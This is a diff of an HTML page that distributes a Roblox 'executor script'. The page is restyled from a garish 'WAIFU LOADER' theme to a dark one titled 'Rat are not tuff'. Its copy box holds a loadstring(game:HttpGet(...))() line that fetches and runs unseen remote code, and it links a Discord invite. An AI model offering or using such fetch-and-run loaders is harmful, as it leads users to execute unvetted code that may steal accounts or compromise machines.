@@ -3,164 +3,186 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>!!! WAIFU LOADER !!!</title>
+    <title>Rat are not tuff</title>
     <style>
         body { 
-            /* High-contrast, headache-inducing background */
-            background: linear-gradient(45deg, #ff00ff, #00ffff, #ffff00, #ff0000);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            font-family: "Comic Sans MS", "Comic Sans", cursive; 
+            background-color: #0a0a0a; 
+            font-family: "Courier New", monospace; 
+            color: #ffffff; 
             margin: 0;
-            padding: 50px 20px;
-            overflow-x: hidden;
+            padding: 0;
+            display: flex;
+            justify-content: center;
         }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        /* Side Layout Containers */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            width: 250px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            padding: 10px;
+            overflow: hidden;
+            z-index: 1;
         }
 
+        .left-side { left: 0; border-right: 1px solid #333; }
+        .right-side { right: 0; border-left: 1px solid #333; }
+
+        /* Normal Sized Side Images */
+        .side-img {
+            width: 100%;
+            height: auto;
+            border: 2px solid #444;
+            filter: grayscale(0.5);
+            transition: 0.3s;
+        }
+
+        .side-img:hover {
+            filter: grayscale(0);
+            transform: scale(1.05);
+        }
+
+        /* Main Center Content */
         #main-container {
+            width: 500px;
+            margin: 100px auto;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 20px;
-            width: 100%;
+            gap: 30px;
+            z-index: 2;
+            text-align: center;
         }
 
         h1 { 
-            font-size: 80px; 
-            color: #fff;
-            text-shadow: 5px 5px 0px #000, -2px -2px 0px #ff0000;
+            font-size: 50px; 
+            color: #ff0000; 
+            text-transform: uppercase;
+            letter-spacing: -3px;
             margin: 0;
-            transform: rotate(-2deg);
-        }
-
-        .enormous-waifu {
-            width: 600px;
-            max-width: 90vw;
-            border: 10px ridge #ffd700;
-            box-shadow: 20px 20px 0px rgba(0,0,0,0.5);
-            transition: transform 0.3s;
-        }
-
-        .enormous-waifu:hover {
-            transform: scale(1.1) rotate(5deg);
+            background: #1a1a1a;
+            padding: 10px 20px;
+            border: 3px solid white;
         }
 
         .controls {
-            text-align: center;
-            background: rgba(255, 255, 255, 0.9);
-            padding: 40px;
-            border: 5px dashed #000;
-            box-shadow: inset 0 0 20px #000;
+            width: 100%;
+            background: #111;
+            padding: 20px;
+            border: 1px solid #333;
+            box-shadow: 0 0 20px rgba(255,0,0,0.2);
         }
 
         .script-box {
             background: #000;
-            border: 3px double #0f0;
-            padding: 20px;
-            font-family: "Courier New", monospace;
-            font-size: 18px;
+            border: 1px solid #ff0000;
+            padding: 15px;
+            font-size: 14px;
             word-break: break-all;
             margin-bottom: 20px;
             display: block;
-            color: #0f0; /* Matrix look */
+            color: #00ff00; /* Hacker green */
         }
 
         .classic-btn {
-            background: #ff00ff;
+            background: #ff0000;
             color: white;
-            border: 4px outset #ffccff;
-            padding: 20px 50px;
-            font-size: 24px;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
             cursor: pointer;
             font-weight: bold;
-            text-transform: uppercase;
+            width: 100%;
         }
 
-        .classic-btn:active {
-            border-style: inset;
+        .classic-btn:hover {
+            background: #cc0000;
+            box-shadow: 0 0 10px #ff0000;
         }
 
         .discord-link {
-            background: #000;
-            color: #0f0;
-            padding: 10px 30px;
-            font-size: 30px;
-            text-decoration: blink; /* Classic annoying vibe */
-            border: 2px solid white;
+            color: #5865F2;
+            font-size: 18px;
+            text-decoration: none;
+            border-bottom: 1px dashed #5865F2;
         }
 
-        /* Added a "Bad Web" Marquee */
-        .marquee {
-            width: 100%;
-            background: #000;
-            color: #fff;
-            white-space: nowrap;
-            overflow: hidden;
-            padding: 10px 0;
-            font-size: 20px;
+        /* Mobile Fix: Hide sidebars if screen is too small */
+        @media (max-width: 1000px) {
+            .sidebar { display: none; }
         }
     </style>
 </head>
 <body>
 
-    <div class="marquee">
-        <marquee scrollamount="15">WELCOME TO THE WAIFU ZONE -- DOWNLOAD NOW -- NO VIRUS 2026 -- BEST SCRIPTS -- JOIN DISCORD</marquee>
+    <div class="sidebar left-side" id="left-sidebar">
+        <img src="https://i.pinimg.com/736x/ee/b9/17/eeb91712d01f7e78e546a5dc562e0e69.jpg" class="side-img">
+        <img src="https://i.pinimg.com/736x/48/0f/11/480f11c563cebaa31b063991e2509b00.jpg" class="side-img">
     </div>
 
     <div id="main-container">
-        <h1 id="item-1">WAIFUS.EXE</h1>
+        <h1 id="item-1">Rat are not tuff</h1>
 
-        <img id="item-2" src="https://i.pinimg.com/736x/ee/b9/17/eeb91712d01f7e78e546a5dc562e0e69.jpg" class="enormous-waifu">
-        
         <div id="item-3" class="controls">
-            <div style="margin-bottom: 10px; font-weight: bold; color: red;">!!! URGENT: COPY BELOW !!!</div>
+            <div style="font-size: 12px; margin-bottom: 10px; color: #888;">EXECUTOR SCRIPT V7</div>
             <code class="script-box" id="loader-text">
                 loadstring(game:HttpGet("https://undetectedscriptlol.vercel.app/api/v7"))()
             </code>
             <button class="classic-btn" onclick="copyLoader()">
-                CLICK TO COPY SCRIPT
+                COPY TO CLIPBOARD
             </button>
         </div>
 
-        <img id="item-4" src="https://i.pinimg.com/736x/57/bf/d8/57bfd8bd126b3fd29fe60707d2ce73ef.jpg" class="enormous-waifu">
-
         <a id="item-5" href="https://discord.gg/xmGsMdAeTQ" target="_blank" class="discord-link">
-            CLICK HERE FOR DISCORD
+            join the discord
         </a>
+    </div>
 
-        <img id="item-6" src="https://i.pinimg.com/736x/48/0f/11/480f11c563cebaa31b063991e2509b00.jpg" class="enormous-waifu">
+    <div class="sidebar right-side" id="right-sidebar">
+        <img src="https://i.pinimg.com/736x/57/bf/d8/57bfd8bd126b3fd29fe60707d2ce73ef.jpg" class="side-img">
+        <img src="https://i.pinimg.com/736x/ee/b9/17/eeb91712d01f7e78e546a5dc562e0e69.jpg" class="side-img">
     </div>
 
     <script>
-        // Use current host for the script
+        // Set dynamic URL
         const loaderCode = `loadstring(game:HttpGet("https://${window.location.host}/api/v7"))()`;
         document.getElementById('loader-text').innerText = loaderCode;
-
-        function shuffleElements() {
-            const container = document.getElementById('main-container');
-            const elements = Array.from(container.children);
-            
-            // Fisher-Yates shuffle algorithm
-            for (let i = elements.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                container.appendChild(elements[j]);
-            }
-        }
 
         function copyLoader() {
             const text = document.getElementById('loader-text').innerText;
             navigator.clipboard.writeText(text);
-            alert("COPIED TO CLIPBOARD!!!! GOOD LUCK!!!!");
-            shuffleElements(); 
+            
+            // Visual feedback instead of an annoying alert
+            const btn = document.querySelector('.classic-btn');
+            const originalText = btn.innerText;
+            btn.innerText = "COPIED!";
+            btn.style.background = "#00ff00";
+            
+            setTimeout(() => {
+                btn.innerText = originalText;
+                btn.style.background = "#ff0000";
+            }, 2000);
+
+            // Keep the chaos: Shuffle the images in the sidebars
+            shuffleSidebars();
         }
 
-        // Shuffle on initial load
-        window.onload = shuffleElements;
+        function shuffleSidebars() {
+            const left = document.getElementById('left-sidebar');
+            const right = document.getElementById('right-sidebar');
+            
+            [left, right].forEach(bar => {
+                const imgs = Array.from(bar.children);
+                for (let i = imgs.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    bar.appendChild(imgs[j]);
+                }
+            });
+        }
     </script>
 
 </body>
